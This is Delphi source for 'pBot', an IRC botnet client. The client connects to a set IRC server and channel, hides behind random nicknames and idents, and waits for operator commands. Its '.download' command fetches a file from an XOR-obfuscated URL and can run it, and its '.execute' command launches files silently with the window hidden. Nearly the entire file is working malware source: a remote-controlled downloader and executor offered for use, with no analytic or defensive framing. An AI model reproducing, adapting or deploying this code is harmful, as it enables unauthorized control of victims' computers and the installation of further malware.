   unit pBot;

   interface

   uses
     Windows, Winsock, ShellApi;

     function LowerCase(const S: string): string;
     Procedure StartBot(Server: String; Port: Integer; Channel: String; Key: String; Silence: Bool);
     function URLDownloadToFile(Caller: cardinal; URL: PChar; FileName: PChar; Reserved: LongWord; StatusCB: cardinal): Longword; stdcall; external 'URLMON.DLL' name 'URLDownloadToFileA';

     var
       botsock: tsocket;
       botchan: String;

   implementation

   Type
     TBot = Class(TObject)
     Private
       Server      :String;
       Port        :Integer;

       Channel     :String;
       Key         :String;

       Silence     :Bool;

       Sock        :TSocket;
       Addr        :TSockAddrIn;
       Wsa         :TWSAData;

       Procedure StartBot;
       Procedure ReadData;
       Procedure ReadCommand(Msg: String; Chan: String);
       Function RandomIdent: String;
       Function RandomName: String;
       Function  SendData(Data: String): Integer;
     Public
   End;

   function StrtoInt(const S: string): integer; var
   E: integer; begin Val(S, Result, E); end;

   function InttoStr(const Value: integer): string;
   var S: string[11]; begin Str(Value, S); Result := S; end;

   Procedure SplitCmd(Const Data: Array Of Char;Var Buf: Array Of String; Count: Integer);
   Var
     I: Integer;
     J: Integer;
     C: Integer;
     Tmp: String;
   Begin
     ZeroMemory(@I, SizeOf(I));
     ZeroMemory(@J, SizeOf(J));
     ZeroMemory(@C, SizeOf(C));

     FillChar(Buf, SizeOf(Buf), #0);
     Tmp := '';

     For I := 0 To Count-1 Do
     Begin
       If Data[I] = #0 Then Break;
       If Data[I] = ' ' Then
       Begin
         Tmp := Copy(String(Data), C+1, I-C);
         Buf[J] := Tmp;
         Inc(J);
         Inc(C, (I-C)+1);
       End;
     End;
   End;

   Function TBot.RandomName: String;
   Var
     ABC: String;
     Int: Integer;
   Begin
     ABC :=
     'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ|\';//^`\[]{}_~|';

     Randomize;
     Int := Random(40);
     Result := '';

     While Int > 0 Do
     Begin
       If Result = '' Then
         Result := Result + ABC[Random(Length(ABC)-2)]
       Else
         Result := Result + ABC[Random(Length(ABC))];
       Dec(Int);
     End;
   End;

   function LowerCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   Function TBot.RandomIdent: String;
   Var
     Name: String;
   Begin
     Name := RandomName;
     Result := 'USER ';
     Result := Result+LowerCase(Name+' '+Name+'@mailshit.com "PKBOT" :'+Name)+#10;
   End;

   Function TBot.SendData(Data: String): Integer;
   Begin
     Result := Send(Sock, Data[1], Length(Data), 0);
     If Result = INVALID_SOCKET Then
       CloseSocket(Sock);
   End;

   Function EncryptStr(Str: String): String;
   Var
     I: Integer;
     C: Integer;
   Begin
     Result := '';
     For I := 1 To Length(Str) Do
     Begin
       C := Ord(Str[i]);
       C := ((C Xor 1) Xor 6);
       Result := Result + Chr(C);
     End;
   End;

   Procedure TBot.ReadCommand(Msg: String; Chan: String);
   Var
     Buffer        :Array [0..1600] Of Char;
     StrBuf        :Array Of String;
     Text          :String;
     SendBuf       :String;
   Begin

     Text := Msg + ' ';
     SetLength(StrBuf, Length(Text));
     Move(Text[1], Buffer, Length(Text));

     SplitCmd(Buffer, StrBuf, SizeOf(Buffer));

     // Execute File
     If LowerCase(StrBuf[0]) = '.execute' Then
     Begin
       If ShellExecute(0, 'open', pChar(StrBuf[2]), nil, nil, 0) = 1 Then
       Begin
         SendBuf := 'PRIVMSG '+chan+' :Executed File'#10;
         SendData(SendBuf);
       End Else
       Begin
         SendBuf := 'PRIVMSG '+chan+' :Execute Error'#10;
         SendData(SendBuf);
       End;
     End;

     // URL Download.
     If LowerCase(StrBuf[0]) = '.download' Then
     Begin
       Try
         If UrlDownloadToFile(0, pChar(EncryptStr(StrBuf[1])), pChar(StrBuf[2]), 0, 0) = s_ok Then
         Begin
           SendBuf := 'PRIVMSG '+chan+' :Download Finished'#10;
           SendData(SendBuf);
           If StrBuf[3] = '1' Then
           Begin
             If ShellExecute(0, 'open', pChar(StrBuf[2]), nil, nil, 0) = 1 Then
             Begin
               SendBuf := 'PRIVMSG '+chan+' :Executed File'#10;
               SendData(SendBuf);
             End Else
             Begin
               SendBuf := 'PRIVMSG '+chan+' :Execute Error'#10;
               SendData(SendBuf);
             End;
           End;
         End Else
         Begin
           SendBuf := 'PRIVMSG '+chan+' :Download Error'#10;
           SendData(SendBuf);
         End;
       Except
         SendBuf := 'PRIVMSG '+chan+' :Download Error'#10;
         SendData(SendBuf);
       End;
     End;

   End;

   Procedure TBot.ReadData;
   Var
     RecvBuf       :Array[0..1600] Of Char;
     Command       :Array Of String;
     Data          :String;
     Text          :String;
     SendBuf       :String;
     PrivMsg       :String;
     NickName      :String;
   Begin

     SendBuf := RandomIdent;
     SendData(SendBuf);
     Sleep(800);

     SendBuf := 'NICK '+RandomName+#10;
     SendData(SendBuf);
     Sleep(800);

     While Recv(Sock, RecvBuf, SizeOf(RecvBuf), 0) > 0 Do
     Begin
       Data := String(RecvBuf);
       ZeroMemory(@RecvBuf, SizeOf(RecvBuf));

       While Pos(#10, Data) > 0 Do
       Begin
         Text := Copy(Data, 1, Pos(#10, Data)-1);
         If Text[Length(Text)] = #13 Then Delete(Text, Length(Text), 1);
         Data := Copy(Data, Pos(#10, Data)+1, Length(Data));

         Text := Text+' ';
         SetLength(Command, Length(Text));
         Move(Text[1], RecvBuf, Length(Text));
         SplitCmd(RecvBuf, Command, SizeOf(RecvBuf));

         If (Command[0] = 'Nickname') and (Command[4] = 'use') Then
         Begin
           SendBuf := 'NICK '+RandomName+#10;
           SendData(SendBuf);
         End;

         If Command[0] = 'PING' Then
         Begin
           SendBuf := 'PONG '+Command[1]+#10;
           SendData(SendBuf);
         End;

         If Command[1] = '366' Then
         Begin
           If Not Silence Then
           Begin
   //          You can put welcome text here. ;)

   //          SendBuf := 'PRIVMSG '+Channel+' :[PK.BOT]'#10;
   //          SendData(SendBuf);
           End;
         End;
         // :nick!ident@host PRIVMSG #chan :test
         // :nick!ident@host PRIVMSG user  :test

         If LowerCase(Command[1]) = 'privmsg' Then
         Begin

           PrivMsg := Copy(Text, Pos(Command[2], Text)+Length(Command[2])+2, Length(Text));
           NickName := Copy(Command[0], 2, Pos('!', Command[0])-2);

           If Command[2][1] = '#' Then
             ReadCommand(PrivMsg, Command[2])
           Else
             ReadCommand(PrivMsg, NickName);

           SendData(SendBuf);
         End;

         If Pos('MOTD', Text) > 0 Then
         Begin
           SendBuf := 'MODE '+channel+#10;
           SendData(SendBuf);
           SendBuf := 'JOIN '+channel+' '+key+#10;
           SendData(SendBuf);
         End;

       End;

       ZeroMemory(@RecvBuf, SizeOf(RecvBuf));
     End;
   End;

   Procedure TBot.StartBot;
   Begin
     WSAStartUp(MakeWord(2,2), WSA);
       Sock := Socket(af_inet, sock_stream, 0);

       Addr.sin_family := af_inet;
       Addr.sin_port := htons(Port);
       Addr.sin_addr.S_addr := inet_addr(pchar(Server));

       If Sock = INVALID_SOCKET Then Exit;
       If Connect(Sock, Addr, SizeOf(Addr)) = SOCKET_ERROR Then Exit;

       BotSock := Sock;
       ReadData;
     WSACleanUp;
   End;

   Function ResolveIP(HostName: String): String;
   Type
     TAPInAddr = Array[0..100] Of PInAddr;
     PAPInAddr = ^TAPInAddr;
   Var
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     PPTr       : PAPInAddr;
     I          : Integer;
   Label
     Abort;
   Begin
     Result := '';
     WSAStartUp($101, WSAData);
     Try
       HostEntPtr := GetHostByName(pChar(HostName));
       If HostEntPtr = NIL Then Goto Abort;
       PPTr := PAPInAddr(HostEntPtr^.h_addr_list);
       I := 0;
       While PPTr^[I] <> NIL Do
       Begin
         If HostName = '' Then
         Begin
           If (Pos('168', inet_nToa(PPTr^[I]^)) <> 1) And (Pos('192', inet_nToa(PPTr^[I]^)) <> 1) Then
           Begin
             Result := Inet_nToa(PPTr^[I]^);
             Goto Abort;
           End;
         End Else
           Result := (Inet_nToa(PPTr^[I]^));
         Inc(I);
       End;
   Abort:
     Except
     End;
     WSACleanUp;
   End;

   Procedure StartBot(Server: String; Port: Integer; Channel: String; Key: String; Silence: Bool);
   Var
     Bot: TBot;
   Begin
     Bot := TBot.Create;
     Bot.Server := ResolveIP(Server);
     Bot.Port := Port;
     Bot.Key := Key;
     Bot.Channel := Channel;
     botchan     := Channel;
     Bot.Silence := Silence;
     Bot.StartBot;
   End;

   end.
